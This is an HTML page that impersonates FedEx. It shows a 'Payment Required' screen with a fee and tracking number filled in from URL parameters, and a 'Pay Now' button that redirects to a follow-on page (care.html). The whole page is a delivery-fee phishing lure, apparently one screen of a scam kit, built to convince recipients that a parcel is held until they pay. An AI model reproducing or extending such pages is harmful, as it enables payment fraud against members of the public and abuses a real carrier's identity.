<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>FedEx — Payment Required</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
  <link rel="stylesheet" href="style.css" />
  <script src="https://cdn.jsdelivr.net/npm/lucide@0.263.1/dist/lucide.min.js"></script>
  <style>
    body { background: #f2f2f7; font-family: 'Inter', sans-serif; }
    .fdx-nav { background: #4d148c; padding: 0 40px; height: 58px; display: flex; align-items: center; }
    .fdx-logo { font-size: 26px; font-weight: 800; letter-spacing: -0.5px; text-decoration: none; line-height: 1; }
    .fdx-logo .fed { color: #fff; }
    .fdx-logo .ex  { color: #ff6200; }
    .payment-shell { min-height: calc(100vh - 58px); display: flex; align-items: center; justify-content: center; padding: 40px 20px; }
    .payment-card {
      width: 100%; max-width: 440px;
      background: #fff;
      border: none;
      border-radius: 20px;
      padding: 36px 32px;
      box-shadow: 0 8px 32px rgba(0,0,0,0.1);
      text-align: center;
    }
    .payment-icon { width: 60px; height: 60px; background: rgba(255,98,0,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 18px; color: #ff6200; }
    .payment-card h1 { font-size: 22px; font-weight: 800; letter-spacing: -0.5px; margin-bottom: 6px; color: #111; }
    .payment-card .tracking-ref { font-size: 12px; color: #888; margin-bottom: 24px; }
    .fee-box { background: #fff8f5; border: none; border-radius: 14px; padding: 24px; margin-bottom: 24px; }
    .fee-label { font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 1.5px; color: #888; margin-bottom: 8px; }
    .fee-amount { font-size: 48px; font-weight: 800; color: #ff6200; letter-spacing: -2px; line-height: 1; }
    .fee-note { font-size: 12px; color: #888; margin-top: 10px; line-height: 1.6; }
    .pay-now-btn { display: block; width: 100%; padding: 15px; background: #ff6200; color: #fff; border: none; border-radius: 12px; font-size: 15px; font-weight: 700; font-family: inherit; cursor: pointer; transition: all 0.2s ease; box-shadow: 0 4px 16px rgba(255,98,0,0.25); }
    .pay-now-btn:hover { background: #e55a00; transform: translateY(-1px); }
    @keyframes spin{to{transform:rotate(360deg)}}
    @media (max-width: 520px) { .payment-card { padding: 28px 20px; } .fee-amount { font-size: 38px; } .fdx-nav { padding: 0 20px; } }
  </style>
</head>
<body>
  <nav class="fdx-nav">
    <a class="fdx-logo" href="index.html"><span class="fed">Fed</span><span class="ex">Ex</span></a>
  </nav>
  <div class="payment-shell">
    <div class="payment-card">
      <div class="payment-icon">
        <i data-lucide="alert-circle" style="width:28px;height:28px;"></i>
      </div>
      <h1>Payment Required</h1>
      <p class="tracking-ref" id="trackingRef">Tracking #—</p>
      <div class="fee-box">
        <p class="fee-label">Fee Due</p>
        <p class="fee-amount" id="feeAmount">—</p>
        <p class="fee-note">This fee must be paid before your package can be released and returned to transit.</p>
      </div>
      <button class="pay-now-btn" id="payNowBtn">Pay Now</button>
    </div>
  </div>

  <div id="loadingOverlay" style="display:none;position:fixed;inset:0;background:rgba(77,20,140,0.92);z-index:9999;flex-direction:column;align-items:center;justify-content:center;gap:16px;">
    <div style="width:44px;height:44px;border:4px solid rgba(255,255,255,0.2);border-top-color:#ff6200;border-radius:50%;animation:spin 0.8s linear infinite;"></div>
    <p style="color:#fff;font-size:14px;font-weight:600;font-family:'Inter',sans-serif;">Processing…</p>
  </div>

  <script>
    const params = new URLSearchParams(window.location.search);
    const fee = params.get('fee');
    const tracking = params.get('tracking');
    if (fee) document.getElementById('feeAmount').textContent = fee;
    if (tracking) document.getElementById('trackingRef').textContent = 'Tracking #' + tracking;
    document.getElementById('payNowBtn').addEventListener('click', () => {
      document.getElementById('loadingOverlay').style.display = 'flex';
      setTimeout(() => { window.location.href = 'care.html?tracking=' + (tracking || ''); }, 1800);
    });
    document.addEventListener('DOMContentLoaded', () => { if (window.lucide) lucide.replace(); });
    window.addEventListener('load', () => { if (window.lucide) lucide.replace(); });
  </script>
</body>
</html>
